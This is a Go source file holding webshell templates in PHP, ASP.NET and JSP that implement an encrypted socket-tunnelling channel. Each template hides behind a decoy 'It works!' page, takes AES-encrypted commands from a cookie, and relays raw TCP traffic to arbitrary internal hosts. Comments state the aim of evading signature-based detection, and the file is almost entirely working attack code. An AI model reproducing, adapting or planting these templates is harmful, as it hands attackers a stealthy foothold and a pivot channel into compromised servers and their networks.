package webshell

// Secure mode webshell templates.
//
// Key differences from basic templates:
//   - AES-256-GCM encryption (not XOR)
//   - Commands read from cookies (not query params)
//   - Responses wrapped in HTML with data in data-cfg attribute
//   - Always returns HTTP 200 OK
//   - No signaturable ?cmd=, ?sid=, ?target= patterns
//
// Placeholders:
//   __ENC_KEY_HEX__  — 32-byte AES key as hex (derived via HKDF from PSK)
//   __COOKIE_NAME__  — cookie name for command encoding

// phpSecureTemplate implements the secure tunnel protocol in PHP 7.2+.
// Uses openssl_encrypt/decrypt with aes-256-gcm.
const phpSecureTemplate = `<?php
$EK = hex2bin('__ENC_KEY_HEX__');
$CN = '__COOKIE_NAME__';

function aesEnc($pt, $k) {
    $iv = random_bytes(12);
    $ct = openssl_encrypt($pt, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $iv, $tag, '', 16);
    return $iv . $ct . $tag;
}

function aesDec($raw, $k) {
    if (strlen($raw) < 28) return false;
    $iv = substr($raw, 0, 12);
    $tag = substr($raw, -16);
    $ct = substr($raw, 12, -16);
    $pt = openssl_decrypt($ct, 'aes-256-gcm', $k, OPENSSL_RAW_DATA, $iv, $tag);
    return $pt;
}

function decCmd($cv, $k) {
    $raw = base64_decode(strtr($cv, '-_', '+/'));
    if ($raw === false) return false;
    $json = aesDec($raw, $k);
    if ($json === false) return false;
    return json_decode($json, true);
}

function wrapResp($data, $status, $k) {
    $payload = chr($status) . $data;
    $enc = aesEnc($payload, $k);
    $b64 = base64_encode($enc);
    return '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Dashboard</title></head><body><div id="root" data-cfg="' . $b64 . '"></div><script src="/assets/main.js" defer></script></body></html>';
}

function emptyPage() {
    return '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Dashboard</title></head><body><div id="root"></div><script src="/assets/main.js" defer></script></body></html>';
}

header('Content-Type: text/html; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    echo '<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>It works!</h1><p>The web server software is running but no content has been added yet.</p></body></html>';
    exit;
}

if (!isset($_COOKIE[$CN])) {
    echo emptyPage();
    exit;
}

$cmd = decCmd($_COOKIE[$CN], $EK);
if ($cmd === false || !isset($cmd['a'])) {
    echo emptyPage();
    exit;
}

$sd = sys_get_temp_dir() . DIRECTORY_SEPARATOR . '.bt' . substr(bin2hex($EK), 0, 8);
if (!is_dir($sd)) @mkdir($sd, 0700, true);

switch ((int)$cmd['a']) {
case 1: // connect
    $tgt = isset($cmd['t']) ? $cmd['t'] : '';
    if (!$tgt) { echo wrapResp('missing target', 1, $EK); exit; }
    $p = strrpos($tgt, ':');
    if ($p === false) { echo wrapResp('bad target', 1, $EK); exit; }
    $h = substr($tgt, 0, $p);
    $pt = (int)substr($tgt, $p + 1);
    $s = @pfsockopen($h, $pt, $en, $es, 10);
    if (!$s) { echo wrapResp('connection failed', 1, $EK); exit; }
    stream_set_blocking($s, false);
    if (function_exists('random_bytes')) {
        $sid = bin2hex(random_bytes(8));
    } else {
        $sid = bin2hex(openssl_random_pseudo_bytes(8));
    }
    @file_put_contents($sd . DIRECTORY_SEPARATOR . $sid, $tgt);
    echo wrapResp(json_encode(array('sid' => $sid)), 0, $EK);
    break;

case 2: // send
    $sid = isset($cmd['s']) ? $cmd['s'] : '';
    if (!preg_match('/^[a-f0-9]+$/', $sid)) { echo wrapResp('bad sid', 1, $EK); exit; }
    $tgt = @file_get_contents($sd . DIRECTORY_SEPARATOR . $sid);
    if (!$tgt) { echo wrapResp('session not found', 1, $EK); exit; }
    $p = strrpos($tgt, ':');
    $s = @pfsockopen(substr($tgt, 0, $p), (int)substr($tgt, $p + 1), $en, $es, 5);
    if (!$s) { echo wrapResp('connection lost', 1, $EK); exit; }
    stream_set_blocking($s, true);
    $body = file_get_contents('php://input');
    $raw = base64_decode($body, true);
    if ($raw !== false) {
        $data = aesDec($raw, $EK);
        if ($data !== false) @fwrite($s, $data);
    }
    echo wrapResp('', 0, $EK);
    break;

case 3: // recv
    $sid = isset($cmd['s']) ? $cmd['s'] : '';
    if (!preg_match('/^[a-f0-9]+$/', $sid)) { echo wrapResp('bad sid', 1, $EK); exit; }
    $tgt = @file_get_contents($sd . DIRECTORY_SEPARATOR . $sid);
    if (!$tgt) { echo wrapResp('session not found', 1, $EK); exit; }
    $p = strrpos($tgt, ':');
    $s = @pfsockopen(substr($tgt, 0, $p), (int)substr($tgt, $p + 1), $en, $es, 5);
    if (!$s) { echo wrapResp('connection lost', 1, $EK); exit; }
    stream_set_blocking($s, false);
    $r = array($s); $w = null; $e = null;
    if (@stream_select($r, $w, $e, 0, 100000) > 0) {
        $buf = @fread($s, 32768);
        if ($buf !== false && strlen($buf) > 0) {
            echo wrapResp($buf, 0, $EK);
            exit;
        }
    }
    echo emptyPage();
    break;

case 4: // disconnect
    $sid = isset($cmd['s']) ? $cmd['s'] : '';
    if (preg_match('/^[a-f0-9]+$/', $sid)) {
        $f = $sd . DIRECTORY_SEPARATOR . $sid;
        $tgt = @file_get_contents($f);
        if ($tgt) {
            $p = strrpos($tgt, ':');
            $s = @pfsockopen(substr($tgt, 0, $p), (int)substr($tgt, $p + 1), $en, $es, 2);
            if ($s) @fclose($s);
        }
        @unlink($f);
    }
    echo wrapResp('', 0, $EK);
    break;

case 0: // ping
    echo wrapResp('pong', 0, $EK);
    break;

default:
    echo emptyPage();
    break;
}
`

// aspxSecureTemplate implements the secure tunnel protocol in C# for ASP.NET (.NET 4.5+).
const aspxSecureTemplate = `<%@ Page Language="C#" AutoEventWireup="true" ValidateRequest="false" EnableViewState="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>
<script runat="server">
    static readonly byte[] _ek = Hd("__ENC_KEY_HEX__");
    static readonly string _cn = "__COOKIE_NAME__";
    static Hashtable _ss;
    static readonly object _lk = new object();

    static byte[] Hd(string h) {
        byte[] b = new byte[h.Length / 2];
        for (int i = 0; i < b.Length; i++)
            b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16);
        return b;
    }

    static Hashtable Sessions() {
        if (_ss == null) {
            lock (_lk) {
                if (_ss == null)
                    _ss = Hashtable.Synchronized(new Hashtable());
            }
        }
        return _ss;
    }

    static byte[] AesEnc(byte[] pt) {
        using (var aes = new AesGcm(_ek)) {
            byte[] iv = new byte[12];
            using (var rng = new RNGCryptoServiceProvider()) rng.GetBytes(iv);
            byte[] ct = new byte[pt.Length];
            byte[] tag = new byte[16];
            aes.Encrypt(iv, pt, ct, tag);
            byte[] result = new byte[12 + ct.Length + 16];
            Array.Copy(iv, 0, result, 0, 12);
            Array.Copy(ct, 0, result, 12, ct.Length);
            Array.Copy(tag, 0, result, 12 + ct.Length, 16);
            return result;
        }
    }

    static byte[] AesDec(byte[] raw) {
        if (raw.Length < 28) return null;
        byte[] iv = new byte[12];
        Array.Copy(raw, 0, iv, 0, 12);
        byte[] tag = new byte[16];
        Array.Copy(raw, raw.Length - 16, tag, 0, 16);
        byte[] ct = new byte[raw.Length - 28];
        Array.Copy(raw, 12, ct, 0, ct.Length);
        byte[] pt = new byte[ct.Length];
        using (var aes = new AesGcm(_ek)) {
            aes.Decrypt(iv, ct, tag, pt);
        }
        return pt;
    }

    static string WrapResp(byte[] data, byte status) {
        byte[] payload = new byte[1 + (data != null ? data.Length : 0)];
        payload[0] = status;
        if (data != null) Array.Copy(data, 0, payload, 1, data.Length);
        byte[] enc = AesEnc(payload);
        string b64 = Convert.ToBase64String(enc);
        return "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\"><title>Dashboard</title></head><body><div id=\"root\" data-cfg=\"" + b64 + "\"></div><script src=\"/assets/main.js\" defer></script></body></html>";
    }

    static string EmptyPage() {
        return "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\"><title>Dashboard</title></head><body><div id=\"root\"></div><script src=\"/assets/main.js\" defer></script></body></html>";
    }

    protected void Page_Load(object sender, EventArgs e) {
        Response.Clear();
        Response.ContentType = "text/html; charset=utf-8";

        if (Request.HttpMethod == "GET") {
            Response.Write("<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>It works!</h1></body></html>");
            return;
        }

        HttpCookie ck = Request.Cookies[_cn];
        if (ck == null || string.IsNullOrEmpty(ck.Value)) {
            Response.Write(EmptyPage());
            return;
        }

        byte[] cmdRaw;
        try {
            string b64 = ck.Value.Replace('-', '+').Replace('_', '/');
            cmdRaw = Convert.FromBase64String(b64);
        } catch { Response.Write(EmptyPage()); return; }

        byte[] cmdJson = AesDec(cmdRaw);
        if (cmdJson == null) { Response.Write(EmptyPage()); return; }

        var js = new JavaScriptSerializer();
        var cmd = js.Deserialize<Dictionary<string,object>>(Encoding.UTF8.GetString(cmdJson));
        if (cmd == null || !cmd.ContainsKey("a")) { Response.Write(EmptyPage()); return; }

        int action = Convert.ToInt32(cmd["a"]);

        switch (action) {
        case 1: // connect
            string target = cmd.ContainsKey("t") ? cmd["t"].ToString() : "";
            if (string.IsNullOrEmpty(target)) { Response.Write(WrapResp(Encoding.UTF8.GetBytes("missing target"), 1)); return; }
            int ci = target.LastIndexOf(':');
            if (ci < 0) { Response.Write(WrapResp(Encoding.UTF8.GetBytes("bad target"), 1)); return; }
            string ch = target.Substring(0, ci);
            int cp = int.Parse(target.Substring(ci + 1));
            TcpClient cc;
            try { cc = new TcpClient(); cc.Connect(ch, cp); }
            catch { Response.Write(WrapResp(Encoding.UTF8.GetBytes("connection failed"), 1)); return; }
            byte[] sb = new byte[8];
            using (var rng = new RNGCryptoServiceProvider()) rng.GetBytes(sb);
            string sid = BitConverter.ToString(sb).Replace("-", "").ToLower();
            Sessions()[sid] = cc;
            Response.Write(WrapResp(Encoding.UTF8.GetBytes("{\"sid\":\"" + sid + "\"}"), 0));
            break;

        case 2: // send
            string ssid = cmd.ContainsKey("s") ? cmd["s"].ToString() : "";
            TcpClient sc = Sessions()[ssid] as TcpClient;
            if (sc == null) { Response.Write(WrapResp(Encoding.UTF8.GetBytes("session not found"), 1)); return; }
            string sbody;
            using (StreamReader sr = new StreamReader(Request.InputStream, Encoding.ASCII)) sbody = sr.ReadToEnd();
            byte[] sraw = Convert.FromBase64String(sbody);
            byte[] sdata = AesDec(sraw);
            if (sdata != null) {
                try { NetworkStream sns = sc.GetStream(); sns.Write(sdata, 0, sdata.Length); }
                catch { Sessions().Remove(ssid); try { sc.Close(); } catch {} }
            }
            Response.Write(WrapResp(new byte[0], 0));
            break;

        case 3: // recv
            string rsid = cmd.ContainsKey("s") ? cmd["s"].ToString() : "";
            TcpClient rc = Sessions()[rsid] as TcpClient;
            if (rc == null) { Response.Write(WrapResp(Encoding.UTF8.GetBytes("session not found"), 1)); return; }
            try {
                NetworkStream rns = rc.GetStream();
                rns.ReadTimeout = 100;
                byte[] rbuf = new byte[32768];
                int rn = rns.Read(rbuf, 0, rbuf.Length);
                if (rn > 0) {
                    byte[] rd = new byte[rn];
                    Array.Copy(rbuf, rd, rn);
                    Response.Write(WrapResp(rd, 0));
                } else { Response.Write(EmptyPage()); }
            } catch (IOException) { Response.Write(EmptyPage()); }
            catch { Sessions().Remove(rsid); try { rc.Close(); } catch {} Response.Write(EmptyPage()); }
            break;

        case 4: // disconnect
            string dsid = cmd.ContainsKey("s") ? cmd["s"].ToString() : "";
            if (!string.IsNullOrEmpty(dsid)) {
                TcpClient dc = Sessions()[dsid] as TcpClient;
                if (dc != null) { Sessions().Remove(dsid); try { dc.Close(); } catch {} }
            }
            Response.Write(WrapResp(new byte[0], 0));
            break;

        case 0: // ping
            Response.Write(WrapResp(Encoding.UTF8.GetBytes("pong"), 0));
            break;

        default:
            Response.Write(EmptyPage());
            break;
        }
    }
</script>
`

// jspSecureTemplate implements the secure tunnel protocol in Java (Servlet, Java 8+).
const jspSecureTemplate = `<%@ page import="java.net.*,java.io.*,java.util.*,java.util.concurrent.*,java.security.*,javax.crypto.*,javax.crypto.spec.*" contentType="text/html;charset=UTF-8" %><%!
    static final String EKH = "__ENC_KEY_HEX__";
    static final String CN = "__COOKIE_NAME__";

    static byte[] hexDec(String h) {
        int l = h.length();
        byte[] d = new byte[l / 2];
        for (int i = 0; i < l; i += 2)
            d[i / 2] = (byte)((Character.digit(h.charAt(i), 16) << 4) + Character.digit(h.charAt(i + 1), 16));
        return d;
    }

    static String hexEnc(byte[] b) {
        StringBuilder sb = new StringBuilder();
        for (byte v : b) sb.append(String.format("%02x", v & 0xff));
        return sb.toString();
    }

    static byte[] aesEnc(byte[] pt, byte[] k) throws Exception {
        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, "AES"), new GCMParameterSpec(128, iv));
        byte[] ct = c.doFinal(pt);
        byte[] out = new byte[12 + ct.length];
        System.arraycopy(iv, 0, out, 0, 12);
        System.arraycopy(ct, 0, out, 12, ct.length);
        return out;
    }

    static byte[] aesDec(byte[] raw, byte[] k) throws Exception {
        if (raw.length < 28) return null;
        byte[] iv = new byte[12];
        System.arraycopy(raw, 0, iv, 0, 12);
        byte[] ct = new byte[raw.length - 12];
        System.arraycopy(raw, 12, ct, 0, ct.length);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(k, "AES"), new GCMParameterSpec(128, iv));
        return c.doFinal(ct);
    }

    static String wrapResp(byte[] data, byte status, byte[] k) throws Exception {
        byte[] payload = new byte[1 + (data != null ? data.length : 0)];
        payload[0] = status;
        if (data != null) System.arraycopy(data, 0, payload, 1, data.length);
        byte[] enc = aesEnc(payload, k);
        String b64 = java.util.Base64.getEncoder().encodeToString(enc);
        return "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\"><title>Dashboard</title></head><body><div id=\"root\" data-cfg=\"" + b64 + "\"></div><script src=\"/assets/main.js\" defer></script></body></html>";
    }

    static String emptyPage() {
        return "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"utf-8\"><title>Dashboard</title></head><body><div id=\"root\"></div><script src=\"/assets/main.js\" defer></script></body></html>";
    }

    @SuppressWarnings("unchecked")
    static ConcurrentHashMap<String, Socket> getSessions(ServletContext ctx) {
        ConcurrentHashMap<String, Socket> s = (ConcurrentHashMap<String, Socket>) ctx.getAttribute("_bs");
        if (s == null) {
            synchronized (ctx) {
                s = (ConcurrentHashMap<String, Socket>) ctx.getAttribute("_bs");
                if (s == null) {
                    s = new ConcurrentHashMap<String, Socket>();
                    ctx.setAttribute("_bs", s);
                }
            }
        }
        return s;
    }
%><%
    byte[] EK = hexDec(EKH);

    if ("GET".equals(request.getMethod())) {
        response.setContentType("text/html; charset=utf-8");
        out.print("<!DOCTYPE html><html><head><title>Welcome</title></head><body><h1>It works!</h1></body></html>");
        return;
    }

    response.setContentType("text/html; charset=utf-8");

    // Read command from cookie
    String cv = null;
    Cookie[] cookies = request.getCookies();
    if (cookies != null) {
        for (Cookie ck : cookies) {
            if (CN.equals(ck.getName())) { cv = ck.getValue(); break; }
        }
    }
    if (cv == null) { out.print(emptyPage()); return; }

    byte[] cmdRaw;
    try {
        String b64 = cv.replace('-', '+').replace('_', '/');
        int pad = (4 - b64.length() % 4) % 4;
        for (int i = 0; i < pad; i++) b64 += "=";
        cmdRaw = java.util.Base64.getDecoder().decode(b64);
    } catch (Exception ex) { out.print(emptyPage()); return; }

    byte[] cmdJson;
    try { cmdJson = aesDec(cmdRaw, EK); }
    catch (Exception ex) { out.print(emptyPage()); return; }
    if (cmdJson == null) { out.print(emptyPage()); return; }

    // Minimal JSON parsing (avoid external deps)
    String js = new String(cmdJson, "UTF-8");
    int aIdx = js.indexOf("\"a\":");
    if (aIdx < 0) { out.print(emptyPage()); return; }
    int action = Character.getNumericValue(js.charAt(aIdx + 4));

    ConcurrentHashMap<String, Socket> sessions = getSessions(application);

    if (action == 1) { // connect
        int tIdx = js.indexOf("\"t\":\"");
        if (tIdx < 0) { out.print(wrapResp("missing target".getBytes("UTF-8"), (byte)1, EK)); return; }
        int tEnd = js.indexOf("\"", tIdx + 5);
        String target = js.substring(tIdx + 5, tEnd);
        int ci = target.lastIndexOf(':');
        if (ci < 0) { out.print(wrapResp("bad target".getBytes("UTF-8"), (byte)1, EK)); return; }
        String host = target.substring(0, ci);
        int port = Integer.parseInt(target.substring(ci + 1));
        Socket sock;
        try { sock = new Socket(); sock.connect(new InetSocketAddress(host, port), 10000); }
        catch (Exception ex) { out.print(wrapResp("connection failed".getBytes("UTF-8"), (byte)1, EK)); return; }
        byte[] sidBytes = new byte[8];
        new SecureRandom().nextBytes(sidBytes);
        String sid = hexEnc(sidBytes);
        sessions.put(sid, sock);
        out.print(wrapResp(("{\"sid\":\"" + sid + "\"}").getBytes("UTF-8"), (byte)0, EK));

    } else if (action == 2) { // send
        int sIdx = js.indexOf("\"s\":\"");
        if (sIdx < 0) { out.print(wrapResp("bad sid".getBytes("UTF-8"), (byte)1, EK)); return; }
        int sEnd = js.indexOf("\"", sIdx + 5);
        String sid = js.substring(sIdx + 5, sEnd);
        Socket sock = sessions.get(sid);
        if (sock == null) { out.print(wrapResp("session not found".getBytes("UTF-8"), (byte)1, EK)); return; }
        StringBuilder body = new StringBuilder();
        BufferedReader reader = request.getReader();
        char[] cbuf = new char[8192];
        int n;
        while ((n = reader.read(cbuf)) != -1) body.append(cbuf, 0, n);
        byte[] raw = java.util.Base64.getDecoder().decode(body.toString());
        byte[] data = aesDec(raw, EK);
        if (data != null) {
            try { OutputStream os = sock.getOutputStream(); os.write(data); os.flush(); }
            catch (Exception ex) { sessions.remove(sid); try { sock.close(); } catch (Exception e2) {} }
        }
        out.print(wrapResp(new byte[0], (byte)0, EK));

    } else if (action == 3) { // recv
        int sIdx = js.indexOf("\"s\":\"");
        if (sIdx < 0) { out.print(wrapResp("bad sid".getBytes("UTF-8"), (byte)1, EK)); return; }
        int sEnd = js.indexOf("\"", sIdx + 5);
        String sid = js.substring(sIdx + 5, sEnd);
        Socket sock = sessions.get(sid);
        if (sock == null) { out.print(wrapResp("session not found".getBytes("UTF-8"), (byte)1, EK)); return; }
        try {
            sock.setSoTimeout(100);
            InputStream is = sock.getInputStream();
            byte[] buf = new byte[32768];
            int n = is.read(buf);
            if (n > 0) {
                byte[] data = new byte[n];
                System.arraycopy(buf, 0, data, 0, n);
                out.print(wrapResp(data, (byte)0, EK));
            } else { out.print(emptyPage()); }
        } catch (SocketTimeoutException ste) { out.print(emptyPage()); }
        catch (Exception ex) { sessions.remove(sid); try { sock.close(); } catch (Exception e2) {} out.print(emptyPage()); }

    } else if (action == 4) { // disconnect
        int sIdx = js.indexOf("\"s\":\"");
        if (sIdx >= 0) {
            int sEnd = js.indexOf("\"", sIdx + 5);
            String sid = js.substring(sIdx + 5, sEnd);
            Socket sock = sessions.remove(sid);
            if (sock != null) { try { sock.close(); } catch (Exception e2) {} }
        }
        out.print(wrapResp(new byte[0], (byte)0, EK));

    } else if (action == 0) { // ping
        out.print(wrapResp("pong".getBytes("UTF-8"), (byte)0, EK));

    } else {
        out.print(emptyPage());
    }
%>
`
